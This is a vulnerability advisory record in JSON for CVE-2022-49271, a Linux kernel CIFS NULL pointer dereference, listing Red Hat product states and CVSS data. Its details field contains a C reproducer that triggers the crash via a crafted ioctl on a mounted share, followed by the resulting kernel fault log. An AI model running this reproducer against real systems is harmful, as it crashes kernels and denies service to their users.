{
  "affected_release": null,
  "package_state": [
    {
      "product_name": "Red Hat Enterprise Linux 6",
      "fix_state": "Not affected",
      "package_name": "kernel",
      "cpe": "cpe:/o:redhat:enterprise_linux:6"
    },
    {
      "product_name": "Red Hat Enterprise Linux 7",
      "fix_state": "Out of support scope",
      "package_name": "kernel",
      "cpe": "cpe:/o:redhat:enterprise_linux:7"
    },
    {
      "product_name": "Red Hat Enterprise Linux 7",
      "fix_state": "Out of support scope",
      "package_name": "kernel-rt",
      "cpe": "cpe:/o:redhat:enterprise_linux:7"
    },
    {
      "product_name": "Red Hat Enterprise Linux 8",
      "fix_state": "Out of support scope",
      "package_name": "kernel",
      "cpe": "cpe:/o:redhat:enterprise_linux:8"
    },
    {
      "product_name": "Red Hat Enterprise Linux 8",
      "fix_state": "Out of support scope",
      "package_name": "kernel-rt",
      "cpe": "cpe:/o:redhat:enterprise_linux:8"
    },
    {
      "product_name": "Red Hat Enterprise Linux 9",
      "fix_state": "Not affected",
      "package_name": "kernel",
      "cpe": "cpe:/o:redhat:enterprise_linux:9"
    },
    {
      "product_name": "Red Hat Enterprise Linux 9",
      "fix_state": "Not affected",
      "package_name": "kernel-rt",
      "cpe": "cpe:/o:redhat:enterprise_linux:9"
    }
  ],
  "threat_severity": "Moderate",
  "public_date": "2025-02-26T00:00:00Z",
  "bugzilla": {
    "description": "kernel: cifs: prevent bad output lengths in smb2_ioctl_query_info()",
    "id": "2347874",
    "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2347874"
  },
  "cvss": {
    "cvss_base_score": "",
    "cvss_scoring_vector": "",
    "status": ""
  },
  "cvss3": {
    "cvss3_base_score": "5.5",
    "cvss3_scoring_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
    "status": "draft"
  },
  "iava": "",
  "cwe": "",
  "statement": "",
  "acknowledgement": "",
  "name": "CVE-2022-49271",
  "document_distribution": "",
  "details": [
    "In the Linux kernel, the following vulnerability has been resolved:\ncifs: prevent bad output lengths in smb2_ioctl_query_info()\nWhen calling smb2_ioctl_query_info() with\nsmb_query_info::flags=PASSTHRU_FSCTL and\nsmb_query_info::output_buffer_length=0, the following would return\n0x10\nbuffer = memdup_user(arg + sizeof(struct smb_query_info),\nqi.output_buffer_length);\nif (IS_ERR(buffer)) {\nkfree(vars);\nreturn PTR_ERR(buffer);\n}\nrather than a valid pointer thus making IS_ERR() check fail.  This\nwould then cause a NULL ptr deference in @buffer when accessing it\nlater in smb2_ioctl_query_ioctl().  While at it, prevent having a\n@buffer smaller than 8 bytes to correctly handle SMB2_SET_INFO\nFileEndOfFileInformation requests when\nsmb_query_info::flags=PASSTHRU_SET_INFO.\nHere is a small C reproducer which triggers a NULL ptr in @buffer when\npassing an invalid smb_query_info::flags\n#include \u003cstdio.h\u003e\n#include \u003cstdlib.h\u003e\n#include \u003cstdint.h\u003e\n#include \u003cunistd.h\u003e\n#include \u003cfcntl.h\u003e\n#include \u003csys/ioctl.h\u003e\n#define die(s) perror(s), exit(1)\n#define QUERY_INFO 0xc018cf07\nint main(int argc, char *argv[])\n{\nint fd;\nif (argc \u003c 2)\nexit(1);\nfd = open(argv[1], O_RDONLY);\nif (fd == -1)\ndie(\"open\");\nif (ioctl(fd, QUERY_INFO, (uint32_t[]) { 0, 0, 0, 4, 0, 0}) == -1)\ndie(\"ioctl\");\nclose(fd);\nreturn 0;\n}\nmount.cifs //srv/share /mnt -o ...\ngcc repro.c \u0026\u0026 ./a.out /mnt/f0\n[  114.138620] general protection fault, probably for non-canonical address 0xdffffc0000000000: 0000 [#1] PREEMPT SMP KASAN NOPTI\n[  114.139310] KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]\n[  114.139775] CPU: 2 PID: 995 Comm: a.out Not tainted 5.17.0-rc8 #1\n[  114.140148] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS rel-1.15.0-0-g2dd4b9b-rebuilt.opensuse.org 04/01/2014\n[  114.140818] RIP: 0010:smb2_ioctl_query_info+0x206/0x410 [cifs]\n[  114.141221] Code: 00 00 00 00 fc ff df 48 c1 ea 03 80 3c 02 00 0f 85 c8 01 00 00 48 b8 00 00 00 00 00 fc ff df 4c 8b 7b 28 4c 89 fa 48 c1 ea 03 \u003c80\u003e 3c 02 00 0f 85 9c 01 00 00 49 8b 3f e8 58 02 fb ff 48 8b 14 24\n[  114.142348] RSP: 0018:ffffc90000b47b00 EFLAGS: 00010256\n[  114.142692] RAX: dffffc0000000000 RBX: ffff888115503200 RCX: ffffffffa020580d\n[  114.143119] RDX: 0000000000000000 RSI: 0000000000000004 RDI: ffffffffa043a380\n[  114.143544] RBP: ffff888115503278 R08: 0000000000000001 R09: 0000000000000003\n[  114.143983] R10: fffffbfff4087470 R11: 0000000000000001 R12: ffff888115503288\n[  114.144424] R13: 00000000ffffffea R14: ffff888115503228 R15: 0000000000000000\n[  114.144852] FS:  00007f7aeabdf740(0000) GS:ffff888151600000(0000) knlGS:0000000000000000\n[  114.145338] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[  114.145692] CR2: 00007f7aeacfdf5e CR3: 000000012000e000 CR4: 0000000000350ee0\n[  114.146131] Call Trace:\n[  114.146291]  \u003cTASK\u003e\n[  114.146432]  ? smb2_query_reparse_tag+0x890/0x890 [cifs]\n[  114.146800]  ? cifs_mapchar+0x460/0x460 [cifs]\n[  114.147121]  ? rcu_read_lock_sched_held+0x3f/0x70\n[  114.147412]  ? cifs_strndup_to_utf16+0x15b/0x250 [cifs]\n[  114.147775]  ? dentry_path_raw+0xa6/0xf0\n[  114.148024]  ? cifs_convert_path_to_utf16+0x198/0x220 [cifs]\n[  114.148413]  ? smb2_check_message+0x1080/0x1080 [cifs]\n[  114.148766]  ? rcu_read_lock_sched_held+0x3f/0x70\n[  114.149065]  cifs_ioctl+0x1577/0x3320 [cifs]\n[  114.149371]  ? lock_downgrade+0x6f0/0x6f0\n[  114.149631]  ? cifs_readdir+0x2e60/0x2e60 [cifs]\n[  114.149956]  ? rcu_read_lock_sched_held+0x3f/0x70\n[  114.150250]  ? __rseq_handle_notify_resume+0x80b/0xbe0\n[  114.150562]  ? __up_read+0x192/0x710\n[  114.150791]  ? __ia32_sys_rseq+0xf0/0xf0\n[  114.151025]  ? __x64_sys_openat+0x11f/0x1d0\n[  114.151296]  __x64_sys_ioctl+0x127/0x190\n[  114.151549]  do_syscall_64+0x3b/0x90\n[  114.151768]  entry_SYSCALL_64_after_hwframe+0x44/0xae\n[  114.152079] RIP: 0033:0x7f7aead043df\n[  114.152306] Code: 00 48 89 44 24 18 31 c0 48 8d 44 24 60 c7 04 24\n---truncated---"
  ],
  "references": [
    "https://www.cve.org/CVERecord?id=CVE-2022-49271\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-49271\nhttps://lore.kernel.org/linux-cve-announce/2025022630-CVE-2022-49271-55c9@gregkh/T"
  ]
}